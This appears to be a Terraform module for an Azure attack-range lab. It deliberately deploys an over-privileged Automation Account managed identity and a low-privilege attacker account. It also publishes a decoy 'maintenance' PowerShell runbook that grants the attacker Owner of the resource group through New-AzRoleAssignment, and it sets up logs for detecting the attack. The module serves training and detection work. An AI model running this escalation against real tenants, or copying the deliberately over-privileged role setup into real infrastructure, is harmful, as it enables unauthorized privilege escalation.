# ==================================================================
# AP08 - Automation Account runbook -> RBAC escalation (Azure, ~zero cost, no VM).
#
# MITRE: T1651 (Cloud Administration Command, PRIMARY - run commands via
# a runbook) + T1098.003 (Additional Cloud Roles - the role assignment that
# grants the privileged role) + T1078.004 (Valid Accounts: Cloud Accounts -
# the attacker persists as Owner). CARTP/CARTE syllabus.
#
# CORE MISCONFIG: an Automation Account with a system-assigned Managed Identity
# that holds a role with Microsoft.Authorization/roleAssignments/write (User
# Access Administrator or Owner) ON THE AP08 RG. A LOW-privilege principal
# with Automation Contributor on that RG authors/imports a runbook and
# launches a job -> the job runs AS the MI (Connect-AzAccount -Identity) -> since
# the MI is over-priv, New-AzRoleAssignment self-grants Owner of the RG ->
# RBAC escalation. The effective ACTOR is the Automation Account's MI (parity with
# AP02, where the actor is the MI stolen via IMDS): the confused deputy is "whoever
# can run a runbook owns the scope of the MI".
#
# Feature-flag pattern: count = var.enable_ap08 ? 1 : 0. reset = apply with
# enable_ap08=false -> count=0 -> destroys ALL of AP08 atomically.
#
# RESET-SAFETY (firm constraint): the MI's role and the RUNTIME escalation are
# RG-SCOPED (scope = the RG, NEVER the subscription). enable_ap08=false destroys the
# RG -> and WITH IT, every runtime role assignment scoped to the RG (the Owner
# self-grant the student executes). Zero out-of-state residue (like AP05/AP07). A
# subscription -Scope would survive the destroy -> residue + blast radius: the lab
# bounds it to the RG ON PURPOSE (analogous to AP05's throwaway forest).
#
# DECLARATIVE WITHOUT A SEED (like AP02/AP03/AP04/AP07, no imperative seed, versus
# AP01/AP05): deploy = just terraform apply. RUNNING the runbook (the "exploit") is
# the STUDENT's action: Terraform PUBLISHES the runbook (loaded gun) but NEVER launches
# a job nor creates a schedule.
#
# toxic-state CAVEAT (like AP05/AP07): the attacker's random_password lands in
# the tfstate (sensitive); sensitive output only. .gitignore blocks *.tfstate*.
#
# providers NOTE: the module ALREADY creates azuread_* (AP02's SP) inheriting azuread
# from the root providers.tf, WITHOUT its own required_providers. AP08 does NOT add a
# provider nor require creating a versions.tf.
# ==================================================================

locals {
  # Short-circuit idiom from AP07 (does not index [0] with the flag off).
  ap08_suffix  = var.enable_ap08 ? random_string.ap08[0].result : ""
  ap08_rg_name = "${var.lab_prefix}-ap08-rg"

  # Automation Account: 6-50 chars, starts with a letter, alphanumeric + hyphens.
  ap08_aa_name = "${var.lab_prefix}-ap08-aa-${local.ap08_suffix}"

  # Variable value -> REAL display name of the built-in role. Both include
  # roleAssignments/write. 'UserAccessAdministrator' -> 'User Access Administrator'.
  ap08_mi_role_name = var.mi_role == "Owner" ? "Owner" : "User Access Administrator"

  # DECOY name (decoy fidelity like AP01/AP07), FIXED to anchor the
  # detection. null if runbook_mode=none (no runbook).
  ap08_runbook_name = var.enable_ap08 && var.runbook_mode != "none" ? "${var.lab_prefix}-ap08-maintenance" : null

  ap08_attacker_upn = "${var.lab_prefix}-ap08-attacker@${var.tenant_domain}"

  # GUARDED scalars ("" with AP08 off): the runbook content ONLY references
  # these, NEVER [0] directly -> evaluating the heredoc with the flag off yields
  # text with empty gaps, never index-out-of-range.
  ap08_attacker_oid = var.enable_ap08 ? azuread_user.ap08_attacker[0].object_id : ""
  ap08_rg_id        = var.enable_ap08 ? azurerm_resource_group.ap08[0].id : ""

  # Telemetry (mirrors local.ap07_collect_logs).
  ap08_collect_logs = var.enable_ap08 && var.collect_automation_logs
  ap08_law_id = local.ap08_collect_logs ? (
    var.existing_log_analytics_workspace_id != null ? var.existing_log_analytics_workspace_id : azurerm_log_analytics_workspace.ap08[0].id
  ) : null
  ap08_law_name = local.ap08_collect_logs && var.existing_log_analytics_workspace_id == null ? azurerm_log_analytics_workspace.ap08[0].name : null

  # Runbook content (deterministic heredoc; only ${local.*} is interpolated;
  # PowerShell $var and $(...) are literals to HCL -they are not ${...}-).
  ap08_poc_content = <<-POC
    <#
      Azure Attack Range - AP08 runbook_mode="poc_escalation". Runs AS the system-
      assigned MI of the Automation Account. The MI holds ${local.ap08_mi_role_name}
      on the RG -> self-grants Owner of the RG to the attacker. SCOPE = the RG ON
      PURPOSE (reset-safe: the assignment dies with the RG; a subscription -Scope
      would SURVIVE the destroy). The output is NOT suppressed so that
      JobStreams is testable; a stealthy attacker would use '| Out-Null' -> the
      data-plane is OPPORTUNISTIC, the control-plane (roleAssignments/write by the MI)
      is UNSUPPRESSIBLE. Terraform PUBLISHES but NEVER executes: the "exploit" is yours to launch.
    #>
    $ErrorActionPreference = 'Stop'
    Connect-AzAccount -Identity | Out-Null
    $ctx = Get-AzContext
    Write-Output "[AP08] Running as the Automation Account MI: $($ctx.Account.Id)"
    $attackerObjectId = '${local.ap08_attacker_oid}'
    $scope            = '${local.ap08_rg_id}'
    Write-Output "[AP08] Granting 'Owner' on $scope to principal $attackerObjectId (New-AzRoleAssignment)..."
    New-AzRoleAssignment -ObjectId $attackerObjectId -RoleDefinitionName 'Owner' -Scope $scope
    Write-Output "[AP08] Escalation complete: the low-priv is now Owner of the RG (T1651 -> T1098.003 -> T1078.004)."
  POC

  ap08_probe_content = <<-PROBE
    <#
      Azure Attack Range - AP08 runbook_mode="benign_probe". Probes the IDENTITY and POWER
      of the MI WITHOUT escalating (careful-operator recon): confirms that the job
      runs AS the MI and that the MI holds ${local.ap08_mi_role_name} on the RG.
      The student WRITES the New-AzRoleAssignment.
    #>
    $ErrorActionPreference = 'Stop'
    Connect-AzAccount -Identity | Out-Null
    $ctx = Get-AzContext
    Write-Output "[AP08] Running as the Automation Account MI: $($ctx.Account.Id)"
    $tok = Get-AzAccessToken -ResourceUrl 'https://management.azure.com/'
    Write-Output "[AP08] Management token obtained (expires $($tok.ExpiresOn)); value NOT printed (secret hygiene)."
    $scope = '${local.ap08_rg_id}'
    Write-Output "[AP08] Roles on $scope (locate this MI with User Access Administrator/Owner):"
    Get-AzRoleAssignment -Scope $scope | Format-Table DisplayName, RoleDefinitionName, Scope -AutoSize
    Write-Output "[AP08] To escalate, write: New-AzRoleAssignment -ObjectId <your oid> -RoleDefinitionName Owner -Scope $scope"
  PROBE

  ap08_runbook_content = var.runbook_mode == "poc_escalation" ? local.ap08_poc_content : local.ap08_probe_content
}

# OWN suffix (do not reuse random_string from AP02/AP07, gated on other flags).
resource "random_string" "ap08" {
  count   = var.enable_ap08 ? 1 : 0
  length  = 5
  lower   = true
  numeric = true
  upper   = false
  special = false
}

# Resource group containing the WHOLE path (bounded blast radius = reset-safe).
resource "azurerm_resource_group" "ap08" {
  count    = var.enable_ap08 ? 1 : 0
  name     = local.ap08_rg_name
  location = var.location

  tags = {
    range       = var.lab_prefix
    attack_path = "AP08"
  }
}

# Automation Account with a system-assigned MI (the effective ACTOR, like AP02's
# MI). sku "Basic": no fixed cost; ~500 min/month of runtime free. NO VM.
# Classic Run-As were retired (sep-2023) -> system-assigned MI = faithful
# primitive for 2024+.
resource "azurerm_automation_account" "ap08" {
  count               = var.enable_ap08 ? 1 : 0
  name                = local.ap08_aa_name
  location            = azurerm_resource_group.ap08[0].location
  resource_group_name = azurerm_resource_group.ap08[0].name
  sku_name            = "Basic"

  identity {
    type = "SystemAssigned"
  }

  tags = {
    range       = var.lab_prefix
    attack_path = "AP08"
  }
}

# PRIVILEGE EXCESS (core): the MI is granted mi_role (UAA or Owner) ON THE RG.
# Both include roleAssignments/write -> the MI can self-grant Owner (UAA can
# grant a higher role to itself). RG-SCOPED. skip_service_principal_
# aad_check: the freshly created MI may not have replicated in AAD (like AP02).
resource "azurerm_role_assignment" "ap08_mi" {
  count                            = var.enable_ap08 ? 1 : 0
  scope                            = azurerm_resource_group.ap08[0].id
  role_definition_name             = local.ap08_mi_role_name
  principal_id                     = azurerm_automation_account.ap08[0].identity[0].principal_id
  skip_service_principal_aad_check = true
}

# Dedicated LOW-PRIV attacker (Approach A). Its ONLY Azure grant is Automation
# Contributor on the RG -> it does NOT have roleAssignments/write: it must drive the MI.
# The password lands in the tfstate (sensitive) -> sensitive output only.
resource "random_password" "ap08_attacker" {
  count   = var.enable_ap08 ? 1 : 0
  length  = 24
  special = true
}

resource "azuread_user" "ap08_attacker" {
  count                 = var.enable_ap08 ? 1 : 0
  user_principal_name   = local.ap08_attacker_upn
  display_name          = "AzRange AP08 Attacker (low-priv Automation Contributor)"
  mail_nickname         = "${var.lab_prefix}-ap08-attacker"
  password              = random_password.ap08_attacker[0].result
  force_password_change = false
}

# Attacker's Automation Contributor ON THE RG (RG-scoped). Explicit principal_type
# avoids azurerm resolving the type via Graph for a freshly created user
# (skip_service_principal_aad_check is for SP/MI, it does not cover users).
resource "azurerm_role_assignment" "ap08_attacker_automation" {
  count                = var.enable_ap08 ? 1 : 0
  scope                = azurerm_resource_group.ap08[0].id
  role_definition_name = "Automation Contributor"
  principal_id         = azuread_user.ap08_attacker[0].object_id
  principal_type       = "User"
}

# EMBEDDED runbook (loaded gun), gated by runbook_mode (none -> not created).
# inline content (azurerm ~3.116 imports and PUBLISHES it; no publish_content_link;
# if a build requires it, add an inert publish_content_link{uri}). log_verbose=
# true -> the New-AzRoleAssignment text travels to JobStreams. Terraform PUBLISHES but
# NEVER launches a job nor creates a schedule. environment CAVEAT (like AP05's
# "the VM powered on"): assumes Az.Accounts/Az.Resources in the Automation Account
# (current images bring them; if missing, import the Az module in Shared Resources).
resource "azurerm_automation_runbook" "ap08" {
  count                   = var.enable_ap08 && var.runbook_mode != "none" ? 1 : 0
  name                    = local.ap08_runbook_name
  location                = azurerm_resource_group.ap08[0].location
  resource_group_name     = azurerm_resource_group.ap08[0].name
  automation_account_name = azurerm_automation_account.ap08[0].name
  runbook_type            = "PowerShell"
  log_verbose             = true
  log_progress            = false
  description             = var.runbook_mode == "poc_escalation" ? "Nightly maintenance (AP08 DECOY). In reality: runs as the MI and self-grants Owner of the RG. YOU fire it; Terraform does not execute it." : "Maintenance probe (AP08 benign_probe): probes the MI's identity/power without escalating; you write the escalation."
  content                 = local.ap08_runbook_content
}

# TELEMETRY (gated enable_ap08 && collect_automation_logs). JobLogs + JobStreams.
# PROPERTY (like AP07's StorageBlobLogs / AP05's AMA-DCR): NOT active by
# default -> without this diagnostic setting the runbook EXECUTION does NOT exist in
# any SIEM. The management plane (jobs/write, roleAssignments/write) DOES flow through
# AzureActivity. DIFFERENCE vs AP07: Automation has NO dedicated table -> OMIT
# log_analytics_destination_type -> AzureDiagnostics (ResourceProvider=MICROSOFT.
# AUTOMATION), where the KQL looks.
resource "azurerm_log_analytics_workspace" "ap08" {
  count               = local.ap08_collect_logs && var.existing_log_analytics_workspace_id == null ? 1 : 0
  name                = "${var.lab_prefix}-ap08-law"
  location            = azurerm_resource_group.ap08[0].location
  resource_group_name = azurerm_resource_group.ap08[0].name
  sku                 = "PerGB2018"
  retention_in_days   = 31
  daily_quota_gb      = var.law_daily_cap_gb
}

resource "azurerm_monitor_diagnostic_setting" "ap08_automation" {
  count                      = local.ap08_collect_logs ? 1 : 0
  name                       = "${var.lab_prefix}-ap08-automation-diag"
  target_resource_id         = azurerm_automation_account.ap08[0].id
  log_analytics_workspace_id = local.ap08_law_id

  enabled_log {
    category = "JobLogs"
  }
  enabled_log {
    category = "JobStreams"
  }

  # metric{AllMetrics,false}: neutralizes the perpetual-diff (AP07 idiom). If your
  # environment rejects 'AllMetrics' for Automation, remove this block (the goal
  # is the LOGS) or add lifecycle{ignore_changes=[metric]}.
  metric {
    category = "AllMetrics"
    enabled  = false
  }
}
